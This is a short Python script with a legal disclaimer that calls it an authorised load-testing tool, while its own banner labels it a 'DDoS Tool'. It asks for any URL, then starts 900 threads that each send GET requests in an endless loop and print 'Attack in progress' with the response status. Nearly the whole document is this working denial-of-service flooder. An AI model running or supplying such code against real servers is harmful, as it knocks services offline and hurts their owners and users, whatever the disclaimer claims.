"""
                    =-----
                   =++==
                  +*++
                 =-*#
                 %:+*@
              @%*::-=+%@
 /$$$$$$$$   @*:..::=-+=@@
|__  $$__/ @#:.::..:---*++@
   | $$    @::-..:::=--#***@   /$$$$$$
   | $$   @#:=.:-..:--*#***@  /$$__  $$
   | $$    @:=:-..-:+=*%###@ | $$  \__/
   | $$    @#:--::::*-*%##@  | $$
   | $$      @#-=--:+%##@@   | $$
   |__/        @@@@@@@@      |__/
   
This script has been developed with a strictly legitimate purpose to assist law enforcement and cybersecurity professionals 
in testing the resilience and robustness of computer systems. It is a load testing tool designed to assess a server's 
or network infrastructure's ability to withstand large amounts of data traffic.

This tool is not intended to be used for malicious attacks, such as DDoS attacks, or any other form of cyberattacks that
would violate the law. Its usage is exclusively reserved for authorized testing by system owners, with the explicit 
consent of competent authorities.

IMPORTANT: This project is intended solely for legitimate purposes and must only be used with proper authorization. 
Any use contrary to these guidelines is strictly prohibited. As the creator of this tool, I accept no responsibility
for any misuse of the script outside of the legal and ethical parameters outlined here.

Violating cybersecurity laws can result in severe criminal penalties, including hefty fines and imprisonment.

The use of this tool must always be preceded by an assessment of potential impacts and a thorough planning process to avoid 
any unintended disruption of essential services.
"""

from colorama import Fore, init
import requests, threading
from os import system, name



init()

def clear(): 
    if name == 'nt': 
        system('cls')
    else: 
        system('clear')


clear()

print(
    f"""
{Fore.LIGHTWHITE_EX}+───────────────────────────────────────────────────────+
|{Fore.LIGHTCYAN_EX} ████████╗ ██████╗ ██████╗ ███╗   ██╗███████╗████████╗{Fore.LIGHTWHITE_EX} |
|{Fore.LIGHTCYAN_EX} ╚══██╔══╝██╔═══██╗██╔══██╗████╗  ██║██╔════╝╚══██╔══╝{Fore.LIGHTWHITE_EX} |
|{Fore.LIGHTCYAN_EX}    ██║   ██║   ██║██████╔╝██╔██╗ ██║█████╗     ██║   {Fore.LIGHTWHITE_EX} |
|{Fore.LIGHTCYAN_EX}    ██║   ██║   ██║██╔══██╗██║╚██╗██║██╔══╝     ██║   {Fore.LIGHTWHITE_EX} |
|{Fore.LIGHTCYAN_EX}    ██║   ╚██████╔╝██║  ██║██║ ╚████║███████╗   ██║   {Fore.LIGHTWHITE_EX} |
|{Fore.LIGHTCYAN_EX}    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   {Fore.LIGHTWHITE_EX} |
+─────────────────────{Fore.CYAN}({Fore.LIGHTRED_EX}DDoS Tool{Fore.CYAN}){Fore.LIGHTWHITE_EX}───────────────────────+
    """
)

url = input(f'{Fore.LIGHTCYAN_EX}URL{Fore.LIGHTWHITE_EX} : ')

def send_requests():
    try:
        while True:
            response = requests.get(url)
            print(f"{Fore.LIGHTRED_EX}    ╟{Fore.LIGHTWHITE_EX}    Attack in progress. . .  {Fore.LIGHTBLACK_EX} │{Fore.LIGHTWHITE_EX}   STATUS{Fore.LIGHTYELLOW_EX} →{Fore.LIGHTGREEN_EX} {response.status_code}")
    except Exception as e:
        print(f"{Fore.LIGHTRED_EX}    ╟{Fore.LIGHTRED_EX}    Connection failed  {Fore.LIGHTBLACK_EX} │{Fore.LIGHTBLACK_EX}   {e}")

threads = []
for i in range(900):
    thread = threading.Thread(target=send_requests)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()